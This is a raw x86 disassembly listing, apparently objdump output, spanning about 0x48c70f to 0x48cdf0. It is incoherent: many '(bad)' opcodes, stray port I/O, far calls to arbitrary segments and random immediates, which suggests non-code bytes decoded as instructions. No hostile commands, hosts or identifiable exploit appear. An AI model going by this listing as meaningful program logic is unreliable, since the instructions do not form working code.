  48c70f:	(bad)  
  48c711:	lods   eax,DWORD PTR es:[esi]
  48c713:	daa    
  48c714:	jecxz  0x48c76d
  48c716:	scas   eax,DWORD PTR es:[edi]
  48c717:	ins    BYTE PTR es:[edi],dx
  48c718:	inc    eax
  48c719:	mov    ds:0x72df0fb6,al
  48c71e:	add    eax,0x576346b0
  48c723:	ss aam 0x80
  48c726:	add    al,BYTE PTR [eax+0x5d6003f]
  48c72c:	in     al,dx
  48c72d:	pop    edi
  48c72e:	ja     0x48c764
  48c730:	icebp  
  48c731:	and    BYTE PTR [ebx],0x1f
  48c734:	ss dec edi
  48c736:	dec    ebp
  48c737:	arpl   WORD PTR [esp+ebp*4+0x3],dx
  48c73b:	addr16 push ebp
  48c73d:	or     BYTE PTR [esi-0x60a03f],al
  48c743:	or     BYTE PTR ds:0x278f60e0,al
  48c749:	imul   edi,DWORD PTR [ebp+edx*2-0x9a4e84c],0x6a
  48c751:	add    DWORD PTR [eax],ecx
  48c753:	adc    eax,0xda4b8f07
  48c758:	add    al,bh
  48c75a:	pop    ds
  48c75b:	xchg   edi,eax
  48c75c:	loope  0x48c7b7
  48c75e:	or     BYTE PTR [ebp-0x49],dh
  48c761:	xchg   edi,eax
  48c762:	call   0x178e877f
  48c767:	lahf   
  48c768:	popa   
  48c769:	aad    0x3a
  48c76b:	pop    ss
  48c76c:	dec    DWORD PTR [esi-0x2db3fed1]
  48c772:	and    BYTE PTR [esi],al
  48c774:	xor    al,0x31
  48c776:	xor    ebp,DWORD PTR [ebp+edx*2+0x484b97b5]
  48c77d:	sbb    DWORD PTR [ecx+ebp*2-0x2f7e5021],ebp
  48c784:	test   al,0x8b
  48c786:	retf   
  48c787:	xor    edi,ebp
  48c789:	push   ecx
  48c78a:	dec    edx
  48c78b:	xchg   DWORD PTR [eax+0x67],ebx
  48c78e:	xchg   edi,eax
  48c78f:	scas   eax,DWORD PTR es:[edi]
  48c790:	rol    DWORD PTR [eax],cl
  48c792:	(bad)  
  48c793:	test   al,0x7
  48c795:	push   ebp
  48c796:	or     DWORD PTR [eax],eax
  48c798:	mov    ds:0xd160af0f,eax
  48c79d:	ins    BYTE PTR es:[edi],dx
  48c79e:	imul   ecx,DWORD PTR [edi+0xc563506],0xffffffa7
  48c7a5:	cmp    esi,DWORD PTR [ebp-0x8ec9ff2]
  48c7ab:	push   edi
  48c7ac:	mov    cl,0x53
  48c7ae:	and    dh,dl
  48c7b0:	pop    ss
  48c7b1:	scas   eax,DWORD PTR es:[edi]
  48c7b2:	adc    DWORD PTR [edx],edx
  48c7b4:	jmp    0x48c7dc
  48c7b6:	daa    
  48c7b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c7b8:	mov    ch,0x8f
  48c7ba:	add    ebp,DWORD PTR [ecx]
  48c7bc:	jg     0x48c831
  48c7be:	aas    
  48c7bf:	in     al,0x20
  48c7c1:	js     0x48c831
  48c7c3:	sub    ecx,DWORD PTR [edi-0x59]
  48c7c6:	inc    ebx
  48c7c7:	dec    edi
  48c7c8:	and    dh,BYTE PTR [ecx-0x54]
  48c7cb:	pop    ds
  48c7cc:	shl    DWORD PTR ds:0x5f899717,cl
  48c7d2:	xor    eax,0x60469960
  48c7d7:	dec    edi
  48c7d8:	xor    al,0x40
  48c7da:	and    DWORD PTR [eax-0x3d7ea8d7],edi
  48c7e0:	es jmp 0x48c822
  48c7e3:	outs   dx,DWORD PTR ds:[esi]
  48c7e4:	cs pop edx
  48c7e6:	pop    es
  48c7e7:	or     DWORD PTR [edi],0x2f
  48c7ea:	push   edi
  48c7eb:	sbb    BYTE PTR ds:0x1faf9452,al
  48c7f1:	inc    ecx
  48c7f2:	outs   dx,DWORD PTR ds:[esi]
  48c7f3:	mov    ch,0x4d
  48c7f5:	mov    bh,0x37
  48c7f7:	stos   DWORD PTR es:[edi],eax
  48c7f8:	les    ebp,FWORD PTR [ebx+0x33]
  48c7fb:	mov    ah,0xe7
  48c7fd:	retf   
  48c7fe:	or     al,BYTE PTR [esp+ebx*4]
  48c801:	jbe    0x48c7ef
  48c803:	ja     0x48c7bc
  48c805:	(bad)  
  48c806:	xor    dl,BYTE PTR [edx+0x43]
  48c809:	mov    edx,0xe7b50fcf
  48c80e:	inc    esi
  48c80f:	or     al,0xd7
  48c811:	mov    ebx,0x40b5cf37
  48c816:	rcr    edx,0x34
  48c819:	pop    edi
  48c81a:	jg     0x48c893
  48c81c:	push   eax
  48c81d:	mov    eax,0xa75ba8ca
  48c822:	and    ah,al
  48c824:	mov    DWORD PTR ds:0xb0939fbf,esi
  48c82a:	call   0x9a80:0x117e9700
  48c831:	stos   BYTE PTR es:[edi],al
  48c832:	cmp    esi,DWORD PTR [esi]
  48c834:	daa    
  48c835:	(bad)  
  48c836:	inc    esi
  48c837:	ins    BYTE PTR es:[edi],dx
  48c838:	or     edx,DWORD PTR [edi-0x5f7ab091]
  48c83e:	adc    al,BYTE PTR [ebx]
  48c840:	dec    edi
  48c841:	xchg   edi,eax
  48c842:	ins    DWORD PTR es:[edi],dx
  48c843:	jmp    0x48c81f
  48c845:	pop    eax
  48c846:	out    dx,eax
  48c847:	adc    BYTE PTR [ebx],bl
  48c849:	pop    edx
  48c84a:	pop    ebx
  48c84b:	movsx  eax,WORD PTR [edi+0x4a962146]
  48c852:	inc    esi
  48c853:	out    dx,eax
  48c854:	dec    edi
  48c855:	popa   
  48c856:	and    DWORD PTR [ebp-0x7668c7c1],ecx
  48c85c:	add    DWORD PTR ds:0xf03d3785,edx
  48c862:	push   ss
  48c863:	sub    ecx,edi
  48c865:	mov    cs,WORD PTR [edi]
  48c867:	push   edx
  48c868:	xor    BYTE PTR [eax-0x2c004a8c],bl
  48c86e:	iret   
  48c86f:	xor    eax,0x5f2b0122
  48c874:	out    dx,eax
  48c875:	push   cs
  48c876:	fsub   st(2),st
  48c878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c879:	inc    edi
  48c87a:	inc    esi
  48c87b:	pop    ss
  48c87c:	ror    DWORD PTR [edx],0x65
  48c87f:	test   BYTE PTR [edi+0xac0aa07],al
  48c885:	push   0xffffffdf
  48c887:	pop    edi
  48c888:	and    BYTE PTR [ebp+ebp*1+0x69],al
  48c88c:	inc    edx
  48c88d:	dec    edi
  48c88e:	xchg   DWORD PTR [eax+0x2e],esp
  48c891:	inc    esi
  48c892:	mov    edi,0x20753f44
  48c897:	add    DWORD PTR [esi],eax
  48c899:	(bad)  
  48c89a:	xchg   edi,eax
  48c89b:	adc    eax,0xc38c2e8c
  48c8a0:	push   0xffffffbf
  48c8a2:	pop    esp
  48c8a3:	xor    DWORD PTR [eax],edx
  48c8a5:	add    BYTE PTR [edi],0xe7
  48c8a8:	cmp    DWORD PTR [esi+0x3f240a90],eax
  48c8ae:	push   es
  48c8af:	pop    ebx
  48c8b0:	shr    edx,0x8f
  48c8b3:	outs   dx,DWORD PTR ds:[esi]
  48c8b4:	jg     0x48c90e
  48c8b6:	ret    
  48c8b7:	(bad)  
  48c8b8:	aaa    
  48c8b9:	mov    ds:0xab0387f7,eax
  48c8be:	adc    edi,DWORD PTR [eax]
  48c8c0:	outs   dx,DWORD PTR ds:[esi]
  48c8c1:	push   edi
  48c8c2:	dec    edx
  48c8c3:	xor    al,ah
  48c8c5:	and    al,0x17
  48c8c7:	xor    DWORD PTR [ebx],eax
  48c8c9:	inc    eax
  48c8ca:	call   0xc3c0:0x4d1f72f4
  48c8d1:	mov    BYTE PTR [edi+0x5a6af763],al
  48c8d7:	mov    bh,0x61
  48c8d9:	xchg   edi,eax
  48c8da:	push   esi
  48c8db:	xlat   BYTE PTR ds:[ebx]
  48c8dc:	or     eax,DWORD PTR [edx-0x7f]
  48c8df:	mov    cl,0x2f
  48c8e1:	pop    es
  48c8e2:	mov    cl,BYTE PTR [ebx]
  48c8e4:	je     0x48c927
  48c8e6:	aaa    
  48c8e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c8e8:	pop    ss
  48c8e9:	sbb    cl,BYTE PTR [esi+0x37572b1b]
  48c8ef:	push   edi
  48c8f0:	mov    ch,cl
  48c8f2:	xchg   esp,eax
  48c8f3:	mov    al,0x47
  48c8f5:	rcr    eax,cl
  48c8f7:	push   ss
  48c8f8:	add    esi,DWORD PTR [edi+0x57]
  48c8fb:	fisttp QWORD PTR [eax+0x44]
  48c8fe:	mov    eax,ds:0x6cf2f07
  48c903:	sub    BYTE PTR [ecx+0x1a],0x6f
  48c907:	xor    BYTE PTR [ecx+0xfa21720],ah
  48c90d:	imul   ebx,DWORD PTR [edi+0x6ea078b9],0xffffffce
  48c914:	xchg   edi,eax
  48c915:	inc    esi
  48c916:	xor    BYTE PTR [ebx-0x3a],ah
  48c919:	mov    eax,0x541fd731
  48c91e:	sub    al,0x6e
  48c920:	adc    ebp,edi
  48c922:	jg     0x48c912
  48c924:	add    ah,BYTE PTR [ecx-0x58090df]
  48c92a:	bound  ecx,QWORD PTR [eax+0x2b]
  48c92d:	push   ss
  48c92e:	daa    
  48c92f:	jcxz   0x48c988
  48c932:	sub    BYTE PTR [ecx+0x2c00bf41],bl
  48c938:	dec    esi
  48c939:	sbb    bh,BYTE PTR [edi]
  48c93b:	adc    esp,DWORD PTR [eax]
  48c93d:	pop    ss
  48c93e:	xchg   ebp,eax
  48c93f:	pop    ds
  48c940:	xor    esi,DWORD PTR [edi]
  48c942:	mov    cl,0xc
  48c944:	inc    edx
  48c945:	leave  
  48c946:	add    BYTE PTR [eax],bh
  48c948:	das    
  48c949:	daa    
  48c94a:	fmul   DWORD PTR [ecx-0x53]
  48c94d:	arpl   WORD PTR [edi+0x7f],cx
  48c950:	pop    ebp
  48c951:	sub    DWORD PTR [esi],esp
  48c953:	or     BYTE PTR [edi+0x1e00cb27],bh
  48c959:	and    ah,bh
  48c95b:	xor    al,0xb5
  48c95d:	xchg   ecx,eax
  48c95e:	push   esi
  48c95f:	mov    al,BYTE PTR [edi]
  48c961:	add    ebp,DWORD PTR [ebx]
  48c963:	dec    eax
  48c964:	dec    esp
  48c965:	pop    eax
  48c966:	(bad)  
  48c968:	mov    edi,0x139070ba
  48c96d:	iret   
  48c96e:	pop    ds
  48c96f:	jg     0x48c953
  48c971:	pop    edx
  48c972:	xchg   ebx,eax
  48c973:	xchg   ebp,eax
  48c974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c975:	xchg   edi,eax
  48c976:	stos   BYTE PTR es:[edi],al
  48c977:	xchg   BYTE PTR [eax-0x1d70a9ab],al
  48c97d:	adc    cl,BYTE PTR [edi]
  48c97f:	les    esi,FWORD PTR [edi]
  48c981:	pop    edi
  48c982:	sbb    edx,DWORD PTR [eax+0x29]
  48c985:	push   ecx
  48c986:	dec    edi
  48c987:	addr16 ret 
  48c989:	inc    edx
  48c98a:	mov    ds:0x7f568389,eax
  48c98f:	or     eax,esp
  48c991:	pusha  
  48c992:	add    BYTE PTR [edi+0x32],al
  48c995:	mov    eax,edx
  48c997:	sbb    cl,BYTE PTR [edx-0x4b40c711]
  48c99d:	or     al,BYTE PTR [edi]
  48c99f:	imul   edi,DWORD PTR [edi],0xfffffff7
  48c9a2:	fbstp  TBYTE PTR [eax-0x205f9522]
  48c9a8:	inc    edi
  48c9a9:	cmp    ah,BYTE PTR [ecx+eiz*1]
  48c9ac:	lea    edi,[edi]
  48c9ae:	imul   esp,DWORD PTR [edx-0x6d],0x74
  48c9b2:	shl    BYTE PTR [esi-0x56a9f8e1],0x35
  48c9b9:	(bad)  
  48c9ba:	aas    
  48c9bb:	scas   eax,DWORD PTR es:[edi]
  48c9bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48c9bd:	outs   dx,BYTE PTR ds:[esi]
  48c9be:	adc    edx,DWORD PTR [edi]
  48c9c0:	inc    esp
  48c9c1:	scas   eax,DWORD PTR es:[edi]
  48c9c2:	inc    esi
  48c9c3:	xchg   ecx,eax
  48c9c4:	test   eax,0x35ffbf43
  48c9c9:	sbb    BYTE PTR [edx],0x8
  48c9cc:	inc    edi
  48c9cd:	ss pop es
  48c9cf:	or     eax,0x4b60b012
  48c9d4:	pop    ss
  48c9d5:	outs   dx,BYTE PTR ds:[esi]
  48c9d6:	je     0x48ca33
  48c9d8:	sbb    BYTE PTR [edi+0x27],ch
  48c9db:	mov    al,ds:0xc7458010
  48c9e0:	pop    edi
  48c9e1:	cmp    ch,BYTE PTR [eax+ebx*1+0x1a2aa721]
  48c9e8:	add    al,0xac
  48c9ea:	ret    
  48c9eb:	mov    edi,0x22424f67
  48c9f0:	les    eax,FWORD PTR [edi+0x13]
  48c9f3:	add    BYTE PTR [ecx],dh
  48c9f5:	mov    al,ds:0x97342f69
  48c9fa:	mov    DWORD PTR [ebp-0x5e],eax
  48c9fd:	(bad)  
  48c9fe:	xor    eax,0x6a014247
  48ca03:	dec    eax
  48ca04:	call   0x1645:0x18344516
  48ca0b:	push   edx
  48ca0c:	mul    DWORD PTR [edi+0x1926b426]
  48ca12:	dec    DWORD PTR [ebx+0xb]
  48ca15:	mov    fs,WORD PTR [edx-0x4ff0c811]
  48ca1b:	push   0xffffffef
  48ca1d:	cmp    eax,0x87cfcbdf
  48ca22:	pop    ebp
  48ca23:	js     0x48ca67
  48ca25:	sbb    cl,BYTE PTR [edi+0x47]
  48ca28:	not    DWORD PTR [edx]
  48ca2a:	ins    BYTE PTR es:[edi],dx
  48ca2b:	cli    
  48ca2c:	mov    bh,ah
  48ca2e:	inc    ebx
  48ca2f:	lahf   
  48ca30:	rol    ebx,cl
  48ca32:	push   ebp
  48ca33:	pop    eax
  48ca34:	xor    edi,ebx
  48ca36:	ret    
  48ca37:	xor    eax,0xe935d86f
  48ca3c:	push   ss
  48ca3d:	(bad)  
  48ca3e:	xor    eax,0xb014d5b3
  48ca43:	sbb    ecx,DWORD PTR [edi-0x7652f909]
  48ca49:	pop    eax
  48ca4a:	pop    edi
  48ca4b:	addr16 mov bh,0x8
  48ca4e:	dec    ecx
  48ca4f:	xchg   BYTE PTR ds:0x8573e257,dh
  48ca55:	push   0x49
  48ca57:	xlat   BYTE PTR ds:[ebx]
  48ca58:	dec    edi
  48ca59:	inc    esp
  48ca5a:	lods   al,BYTE PTR ds:[esi]
  48ca5b:	and    BYTE PTR [eax+0x8],dh
  48ca5e:	pop    ds
  48ca5f:	outs   dx,DWORD PTR ds:[esi]
  48ca60:	mov    al,0x1a
  48ca62:	sub    al,0x5d
  48ca64:	xchg   edi,edx
  48ca66:	pop    eax
  48ca67:	int    0x90
  48ca69:	push   esi
  48ca6a:	outs   dx,DWORD PTR ds:[esi]
  48ca6b:	aaa    
  48ca6c:	mov    ah,0xa
  48ca6e:	push   ecx
  48ca6f:	or     BYTE PTR [edi-0x3fe4ae42],ch
  48ca75:	sbb    bh,bh
  48ca77:	out    dx,eax
  48ca78:	cs pop eax
  48ca7a:	push   edi
  48ca7b:	or     al,BYTE PTR [edi+0x41ac6c77]
  48ca81:	and    ebp,edi
  48ca83:	imul   esp,DWORD PTR [ecx],0x8f0f5585
  48ca89:	xchg   edi,eax
  48ca8a:	inc    edx
  48ca8b:	test   DWORD PTR [eax+0x24ef871f],esi
  48ca91:	or     eax,0xc76946
  48ca96:	sub    eax,0xf783f5d2
  48ca9b:	or     ch,BYTE PTR [ebx+0x1f189590]
  48caa1:	mov    edi,0x9610ec6a
  48caa6:	xor    BYTE PTR [edi-0x49],cl
  48caa9:	les    esp,FWORD PTR [ebp+ebx*2-0x6a]
  48caad:	outs   dx,DWORD PTR ss:[si]
  48cab0:	dec    esi
  48cab1:	sbb    DWORD PTR [eax+0x3737e7bd],edi
  48cab7:	dec    edi
  48cab8:	popf   
  48cab9:	(bad)  
  48caba:	and    eax,DWORD PTR [ebp+0x282f4537]
  48cac0:	test   BYTE PTR [edx],ah
  48cac2:	imul   eax,edi,0x69
  48cac5:	mov    bl,0xf0
  48cac7:	je     0x48caf0
  48cac9:	outs   dx,DWORD PTR ds:[esi]
  48caca:	pop    ss
  48cacb:	inc    edx
  48cacc:	sub    eax,esi
  48cace:	outs   dx,BYTE PTR ds:[esi]
  48cacf:	mov    bl,0xa7
  48cad1:	xchg   esp,eax
  48cad2:	mov    al,BYTE PTR [eax]
  48cad4:	loopne 0x48cad5
  48cad6:	ja     0x48ca8d
  48cad8:	stos   BYTE PTR es:[edi],al
  48cad9:	imul   esi,DWORD PTR [esi+0x34cf36d7],0x49
  48cae0:	jp     0x48ca74
  48cae2:	pop    ds
  48cae3:	iret   
  48cae4:	push   0xffffff8d
  48cae6:	outs   dx,BYTE PTR ss:[esi]
  48cae8:	es aas 
  48caea:	pop    ss
  48caeb:	cmc    
  48caec:	add    DWORD PTR [ebx+eax*1+0x27],ebx
  48caf0:	out    dx,eax
  48caf1:	inc    ecx
  48caf2:	mov    dl,BYTE PTR [ebx]
  48caf4:	mov    BYTE PTR [edi-0x21],0x48
  48caf8:	xor    BYTE PTR [eax],al
  48cafa:	add    eax,DWORD PTR [edx+0x37]
  48cafd:	ins    BYTE PTR es:[edi],dx
  48cafe:	arpl   WORD PTR [ebx],si
  48cb00:	inc    esi
  48cb01:	inc    esi
  48cb02:	iret   
  48cb03:	xor    BYTE PTR [ecx-0x9e8a9cc],bh
  48cb09:	xor    al,0x81
  48cb0b:	punpcklwd mm3,DWORD PTR [ebx-0x39]
  48cb0f:	xchg   edi,eax
  48cb10:	not    esi
  48cb12:	and    al,0x4
  48cb14:	sub    cl,BYTE PTR [edi]
  48cb16:	out    0xc6,eax
  48cb18:	add    BYTE PTR [edx-0x4f],ch
  48cb1b:	fild   WORD PTR [edi]
  48cb1d:	mov    al,ds:0xf389022
  48cb22:	daa    
  48cb23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48cb24:	imul   eax,DWORD PTR [ecx],0x31
  48cb27:	fistp  WORD PTR [edi+0x40b830f5]
  48cb2d:	inc    edi
  48cb2e:	mov    bh,0x23
  48cb30:	mov    al,ds:0x87878b6b
  48cb35:	cmp    BYTE PTR [edi],ah
  48cb37:	jbe    0x48cb06
  48cb39:	adc    al,0x52
  48cb3b:	cmovae ebx,edi
  48cb3e:	(bad)  [edx]
  48cb40:	dec    eax
  48cb41:	or     esp,DWORD PTR [ebx]
  48cb43:	into   
  48cb44:	push   esp
  48cb45:	and    al,0xba
  48cb47:	sub    DWORD PTR [edi],ecx
  48cb49:	xchg   edi,eax
  48cb4a:	sub    al,0x38
  48cb4c:	push   es
  48cb4d:	mov    cs,WORD PTR [edi+0x38]
  48cb50:	das    
  48cb51:	adc    BYTE PTR [esi],dl
  48cb53:	adc    DWORD PTR [edi+esi*4],eax
  48cb56:	xchg   edi,eax
  48cb57:	inc    edx
  48cb58:	loope  0x48cbbc
  48cb5a:	mov    edi,0x903e5745
  48cb5f:	xchg   ebp,eax
  48cb60:	inc    esi
  48cb61:	adc    DWORD PTR [edi],edi
  48cb63:	loopne 0x48cb6d
  48cb65:	push   ss
  48cb66:	jmp    0x48cbd7
  48cb68:	mov    ?,WORD PTR [edi-0x3b3ff6bc]
  48cb6e:	or     al,0xd7
  48cb70:	xor    DWORD PTR [esi+0x12],esp
  48cb73:	inc    ebx
  48cb74:	adc    BYTE PTR [edi],bh
  48cb76:	xor    bh,dh
  48cb78:	push   edx
  48cb79:	push   edi
  48cb7a:	push   0xc54577a4
  48cb7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48cb80:	outs   dx,BYTE PTR es:[esi]
  48cb82:	xlat   BYTE PTR ds:[ebx]
  48cb83:	inc    esi
  48cb84:	jg     0x48cb72
  48cb86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48cb87:	cmc    
  48cb88:	dec    edx
  48cb89:	sub    bh,0x28
  48cb8c:	add    al,0xa3
  48cb8e:	add    DWORD PTR [edi+0x2c568c01],edi
  48cb94:	mov    edi,0x15280e66
  48cb99:	pop    ss
  48cb9a:	mov    bh,0x37
  48cb9c:	aad    0x0
  48cb9e:	push   edx
  48cb9f:	rcl    edi,1
  48cba1:	mov    edi,0xba2eb5a4
  48cba6:	mov    BYTE PTR [edi+0x34],0xa7
  48cbaa:	xor    cl,BYTE PTR [edx+0x29]
  48cbad:	(bad)  
  48cbae:	ror    BYTE PTR [edi+0x1e3d69ff],0xb1
  48cbb5:	aas    
  48cbb6:	mov    gs,WORD PTR [esi]
  48cbb8:	lds    ebx,FWORD PTR [eax-0x48baf8d6]
  48cbbe:	cmp    ah,BYTE PTR [esi+0x53]
  48cbc1:	imul   edi,eax,0xfffffffb
  48cbc4:	cmp    DWORD PTR [edi],ebp
  48cbc6:	punpcklbw mm2,DWORD PTR [ebp-0x26]
  48cbca:	mov    al,0x47
  48cbcc:	mov    DWORD PTR [ebx],0x27205581
  48cbd2:	aaa    
  48cbd3:	sbb    eax,0x2f6b54b8
  48cbd8:	scas   eax,DWORD PTR es:[edi]
  48cbd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48cbda:	jmp    0x364f:0x872cbad8
  48cbe1:	or     eax,edx
  48cbe3:	daa    
  48cbe4:	mov    cl,0x5f
  48cbe6:	(bad)  [eax-0x53fef8]
  48cbec:	mov    edi,0xd8170068
  48cbf1:	add    esp,DWORD PTR [edi]
  48cbf3:	or     cl,BYTE PTR [ebp+0x45e754c4]
  48cbf9:	xchg   edi,eax
  48cbfa:	mov    bh,0xad
  48cbfc:	lods   eax,DWORD PTR ds:[esi]
  48cbfd:	xchg   ebx,eax
  48cbfe:	jg     0x48cb8f
  48cc00:	mov    bl,0xf7
  48cc02:	xchg   esp,eax
  48cc03:	mov    esp,0x45bf0000
  48cc08:	lea    ebx,[eax-0x3f]
  48cc0b:	mov    al,0x9f
  48cc0d:	xor    ah,BYTE PTR [edi+0x7]
  48cc10:	or     BYTE PTR [ebp+0x14],cl
  48cc13:	outs   dx,BYTE PTR ds:[esi]
  48cc14:	xor    BYTE PTR [edi-0x6f4b8fe6],0x67
  48cc1b:	test   DWORD PTR [edi+0x6a],0xff1554c9
  48cc22:	inc    edx
  48cc23:	cmp    dl,dl
  48cc25:	push   ebp
  48cc26:	pop    DWORD PTR gs:[ebx-0x25]
  48cc2a:	leave  
  48cc2b:	or     dl,BYTE PTR [ecx]
  48cc2d:	xchg   ebx,eax
  48cc2e:	pop    ss
  48cc2f:	xor    DWORD PTR [ebx],eax
  48cc31:	xchg   ebx,eax
  48cc32:	pop    esp
  48cc33:	ds inc esp
  48cc35:	xor    eax,0x24d1c697
  48cc3a:	sub    DWORD PTR [edi+0x31],esi
  48cc3d:	and    dl,BYTE PTR [ebx+0x6f]
  48cc40:	pop    ebp
  48cc41:	aaa    
  48cc42:	or     ebp,DWORD PTR [edi]
  48cc44:	enter  0x2cd8,0xac
  48cc48:	daa    
  48cc49:	or     bl,al
  48cc4b:	mov    al,0x88
  48cc4d:	(bad)  
  48cc4e:	pop    DWORD PTR [ecx+0x2e]
  48cc51:	push   ebx
  48cc52:	mov    ebx,0x6fcfefb5
  48cc57:	fsubr  DWORD PTR [ecx+ecx*1+0x9]
  48cc5b:	imul   eax,DWORD PTR [edi+0x171982dc],0xfffffffb
  48cc62:	xsha1  (bad)
  48cc63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48cc64:	mov    ebx,DWORD PTR [ebp+0x5a]
  48cc67:	out    0x17,eax
  48cc69:	das    
  48cc6a:	bound  eax,QWORD PTR [eax-0x20984880]
  48cc70:	call   0xcf5dccdf
  48cc75:	xor    eax,0x14303314
  48cc7a:	aas    
  48cc7b:	inc    esp
  48cc7c:	push   edi
  48cc7d:	mov    bl,0xa4
  48cc7f:	push   eax
  48cc80:	repnz xor al,BYTE PTR [eax]
  48cc83:	xor    ah,bh
  48cc85:	pop    edx
  48cc86:	int3   
  48cc87:	mov    al,0x56
  48cc89:	das    
  48cc8a:	mov    WORD PTR [esi],ss
  48cc8c:	arpl   WORD PTR ds:0x4bd7d7df,bx
  48cc92:	push   cs
  48cc93:	mov    dh,0xa
  48cc95:	pop    ss
  48cc96:	push   DWORD PTR [ebx]
  48cc98:	mov    eax,ds:0x8714c019
  48cc9d:	xor    eax,0x64d163bf
  48cca2:	add    DWORD PTR [edi+0x35a0b8b0],esp
  48cca8:	mov    edi,0x206ab967
  48ccad:	(bad)  
  48ccae:	jmp    DWORD PTR [edi]
  48ccb0:	aaa    
  48ccb1:	stos   DWORD PTR es:[edi],eax
  48ccb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48ccb3:	jne    0x48cd16
  48ccb5:	pop    es
  48ccb6:	jecxz  0x48cced
  48ccb8:	push   ecx
  48ccb9:	fs add edi,edi
  48ccbc:	inc    edx
  48ccbd:	add    BYTE PTR [ebx+0x4127b028],bl
  48ccc3:	push   DWORD PTR [edx+0x6c]
  48ccc6:	xchg   ebx,eax
  48ccc7:	outs   dx,BYTE PTR ds:[esi]
  48ccc8:	ss pop ss
  48ccca:	push   DWORD PTR [esi]
  48cccc:	sbb    BYTE PTR [eax+esi*4+0x5b],0x2e
  48ccd1:	(bad)  
  48ccd2:	cmp    DWORD PTR [ebp+0x760ad66],edx
  48ccd8:	xchg   edi,eax
  48ccd9:	dec    edx
  48ccda:	stos   BYTE PTR es:[edi],al
  48ccdb:	adc    DWORD PTR [eax],ecx
  48ccdd:	(bad)  
  48ccdf:	ss pop ebp
  48cce1:	jp     0x48ccce
  48cce3:	rol    BYTE PTR [edi+0x47],0xdf
  48cce7:	mov    bl,BYTE PTR [ebp+0x32]
  48ccea:	push   ss
  48cceb:	out    dx,eax
  48ccec:	pop    ss
  48cced:	aad    0x4c
  48ccef:	add    DWORD PTR [ecx+0x24eb9557],eax
  48ccf5:	xor    DWORD PTR [edi+0x5a014638],0x27312532
  48ccff:	(bad)  
  48cd00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48cd01:	mov    DWORD PTR [edi+0x32],eax
  48cd04:	mov    edi,0x6141da3f
  48cd09:	ins    BYTE PTR es:[edi],dx
  48cd0a:	inc    edi
  48cd0b:	mov    bh,0xca
  48cd0d:	or     BYTE PTR [ebp-0x3b],bl
  48cd10:	pop    ds
  48cd11:	aaa    
  48cd12:	or     edx,DWORD PTR [ecx+0x2b]
  48cd15:	mov    ecx,0xb0436740
  48cd1a:	dec    eax
  48cd1b:	sub    DWORD PTR [esi+0x27],eax
  48cd1e:	ret    
  48cd1f:	inc    ecx
  48cd20:	dec    esp
  48cd21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48cd22:	push   ebp
  48cd23:	out    dx,eax
  48cd24:	div    DWORD PTR [edx]
  48cd26:	xor    eax,0x872ac2d8
  48cd2b:	mov    bh,0x40
  48cd2d:	test   DWORD PTR [esi+0x60],esp
  48cd30:	dec    edi
  48cd31:	adc    dh,BYTE PTR [eax+0x39a62f92]
  48cd37:	add    BYTE PTR [edx],dh
  48cd39:	in     eax,dx
  48cd3a:	or     BYTE PTR [ebx-0x3c],al
  48cd3d:	aaa    
  48cd3e:	inc    edx
  48cd3f:	add    esp,DWORD PTR [edi+0x1b]
  48cd42:	or     DWORD PTR [ebp+0x18],0xffffffdf
  48cd46:	mov    edx,0x2e85d384
  48cd4b:	lahf   
  48cd4c:	pop    edi
  48cd4d:	inc    ebx
  48cd4e:	mov    ds:0x4f46024b,eax
  48cd53:	push   edi
  48cd54:	nop
  48cd55:	inc    eax
  48cd56:	and    ah,0x34
  48cd59:	add    BYTE PTR [ecx],dh
  48cd5b:	fadd   st(0),st
  48cd5d:	push   cs
  48cd5e:	call   0x9900555a
  48cd63:	dec    edx
  48cd64:	call   0x345867af
  48cd69:	arpl   WORD PTR [edx+0x24],bp
  48cd6c:	pop    es
  48cd6d:	sahf   
  48cd6e:	aaa    
  48cd6f:	mov    ebx,0xb9561002
  48cd74:	jmp    0x48cd95
  48cd76:	xor    al,0x6
  48cd78:	inc    ecx
  48cd79:	mov    eax,ds:0x89b4df17
  48cd7e:	pop    edx
  48cd7f:	test   DWORD PTR [edi+0x2850aff],ebp
  48cd85:	call   0x6a20a518
  48cd8a:	xlat   BYTE PTR ds:[ebx]
  48cd8b:	mov    dh,BYTE PTR [eax+0x362ecf9f]
  48cd91:	test   BYTE PTR [esi],al
  48cd93:	push   edi
  48cd94:	aas    
  48cd95:	das    
  48cd96:	ror    DWORD PTR [eax-0x1010fd6d],0xc0
  48cd9d:	inc    edx
  48cd9e:	loopne 0x48cdca
  48cda0:	adc    eax,DWORD PTR [edi+0x30]
  48cda3:	or     eax,0x33479271
  48cda8:	das    
  48cda9:	(bad)  
  48cdaa:	or     eax,0xfa0f6322
  48cdaf:	xchg   ebp,eax
  48cdb0:	cmp    al,BYTE PTR ds:0x83ffbfac
  48cdb6:	xchg   ebx,eax
  48cdb7:	(bad)  
  48cdb8:	xchg   ebp,eax
  48cdb9:	fild   QWORD PTR [edi+0x718ac157]
  48cdbf:	call   0x2ea4:0x48319f97
  48cdc6:	pop    eax
  48cdc7:	pop    edi
  48cdc8:	mov    BYTE PTR [ebp+0x34],dl
  48cdcb:	test   al,0x27
  48cdcd:	xchg   DWORD PTR [eax-0xc0e6cee],esi
  48cdd3:	xlat   BYTE PTR ds:[ebx]
  48cdd4:	pop    ebx
  48cdd5:	shl    ah,0xe0
  48cdd8:	mov    DWORD PTR [esi-0x5e],0xd7a052c9
  48cddf:	jg     0x48cd8d
  48cde1:	outs   dx,BYTE PTR ds:[esi]
  48cde2:	(bad)
  48cde7:	ret    
  48cde8:	retf   
  48cde9:	and    al,0x83
  48cdeb:	sub    edx,DWORD PTR [edi]
  48cded:	or     dl,BYTE PTR [ebp-0x40]
  48cdf0:	stos   BYTE PTR es:[edi],al
